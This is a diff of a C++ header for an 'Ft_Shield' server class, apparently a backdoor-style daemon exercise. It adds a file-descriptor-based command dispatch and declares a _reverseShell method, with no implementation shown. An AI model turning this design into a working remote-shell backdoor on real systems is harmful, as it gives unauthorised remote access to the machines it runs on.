@@ -24,7 +24,7 @@ class Ft_Shield
 {
 	public:
 	/*---------- Public typedef --------------------*/
-		typedef void (Ft_Shield::*t_fptr)(void);
+		typedef void (Ft_Shield::*t_fptr)(int);
 		typedef std::map<std::string, t_fptr> t_commands;
 	/*---------- Constructors ----------------------*/
 					Ft_Shield(void);
@@ -42,6 +42,7 @@ class Ft_Shield
 		const int		_port;
 		const int		_MaxClients;
 		bool			_run;
+		int				_maxfd;
 		int				_lockFile;
 		int				_logFile;
 		int				_nClients;
@@ -54,7 +55,9 @@ class Ft_Shield
 		void		_checkInstance(void);
 		int			_mkSrv(void);
 		void		_runSrv(void);
-		void		_shutdown(void);
+		void		_exit(void);
+		void		_shutdown(int fd);
+		void		_reverseShell(int fd);
 };
 
 #endif /* FT_SHIELD_HPP */
